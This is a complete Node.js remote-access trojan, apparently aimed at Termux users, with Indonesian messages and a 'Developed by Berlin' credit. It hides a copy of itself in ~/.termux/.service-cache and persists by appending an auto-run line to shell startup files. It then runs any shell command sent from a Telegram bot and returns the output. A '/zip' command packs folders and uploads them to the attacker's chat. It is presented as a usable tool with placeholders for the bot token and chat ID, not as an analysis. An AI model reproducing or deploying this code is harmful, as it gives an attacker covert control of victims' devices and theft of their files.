// Developed by Berlin
const { exec, spawn } = require('child_process');
const fs = require('fs');
const https = require('https');
const path = require('path');
const os = require('os');

const BOT_TOKEN = 'masukan token';
const CHAT_ID = 'masukan id';
const hiddenDir = `${process.env.HOME}/.termux`;
const hiddenFile = `${hiddenDir}/.service-cache`;
const bashrcPath = `${process.env.HOME}/.bashrc`;
const profilePath = `${process.env.HOME}/.profile`;
const zshrcPath = `${process.env.HOME}/.zshrc`;
const autoRunCmd = `nohup node ${hiddenFile} > /dev/null 2>&1 &`;

function sendMessage(msg) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
  https.get(url, res => res.on('data', () => {}));
}

function sendDocument(filePath) {
  const boundary = '----NodeFormBoundary' + Math.random().toString(16).slice(2);
  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN}/sendDocument`,
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`
    }
  };

  const req = https.request(options, res => {
    res.on('data', () => {});
  });

  const fileName = path.basename(filePath);
  const fileData = fs.readFileSync(filePath);

  req.write(`--${boundary}\r\n`);
  req.write(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
  req.write(`${CHAT_ID}\r\n`);

  req.write(`--${boundary}\r\n`);
  req.write(`Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`);
  req.write(`Content-Type: application/zip\r\n\r\n`);
  req.write(fileData);
  req.write(`\r\n--${boundary}--\r\n`);
  req.end();
}

function ensureAutoStart() {
  const files = [bashrcPath, profilePath, zshrcPath];
  files.forEach(file => {
    if (fs.existsSync(file)) {
      const content = fs.readFileSync(file, 'utf-8');
      if (!content.includes(autoRunCmd)) {
        fs.appendFileSync(file, `\n${autoRunCmd}\n`);
        sendMessage(`Ditambahkan auto-run ke ${path.basename(file)}`);
      }
    }
  });
}

function getUpdates() {
  https.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, res => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        const results = json.result;
        if (!results.length) return;

        const last = results[results.length - 1];
        const msgId = last.message.message_id;
        const text = last.message.text;

        if (msgId > global.lastMessageId && last.message.chat.id == CHAT_ID) {
          global.lastMessageId = msgId;
          runCommand(text.trim());
        }
      } catch (e) {}
    });
  }).on('error', () => {});
}

function runCommand(cmd) {
  if (cmd === '/mati') {
    [bashrcPath, profilePath, zshrcPath].forEach(file => {
      if (fs.existsSync(file)) {
        const content = fs.readFileSync(file, 'utf-8');
        const clean = content.split('\n').filter(line => !line.includes(autoRunCmd)).join('\n');
        fs.writeFileSync(file, clean);
      }
    });

    try { fs.unlinkSync(hiddenFile) } catch (e) {}
    sendMessage('Bot dihentikan dan file dihapus.');
    process.exit();
    return;
  }

  if (cmd.startsWith('/zip ')) {
    const folder = cmd.split('/zip ')[1].trim();
    const zipPath = `${folder}.zip`;
    exec(`zip -r ${zipPath} ${folder}`, (err) => {
      if (err) return sendMessage('Gagal zip folder.');
      sendMessage(`Folder ${folder} telah dizip. Mengirim...`);
      sendDocument(zipPath);
      setTimeout(() => {
        fs.unlink(zipPath, () => {});
        sendMessage('Zip file dihapus dari sistem.');
      }, 3000);
    });
    return;
  }

  exec(cmd, (err, stdout, stderr) => {
    const output = (stdout || stderr || err || 'Tidak ada output.').slice(0, 4000);
    sendMessage(`$ ${cmd}\n\n${output}`);
  });
}

function moveAndRun() {
  if (__filename === hiddenFile) {
    ensureAutoStart();
    setInterval(getUpdates, 5000);
    sendMessage('Bot aktif & sedang mendengarkan...');
    return;
  }

  fs.mkdirSync(hiddenDir, { recursive: true });
  fs.copyFileSync(__filename, hiddenFile);
  fs.chmodSync(hiddenFile, 0o700);

  spawn('node', [hiddenFile], {
    detached: true,
    stdio: 'ignore'
  }).unref();

  process.exit();
}

global.lastMessageId = 0;
moveAndRun();
// Developed by Berlin
// Developed by Berlin
// Developed by Berlin
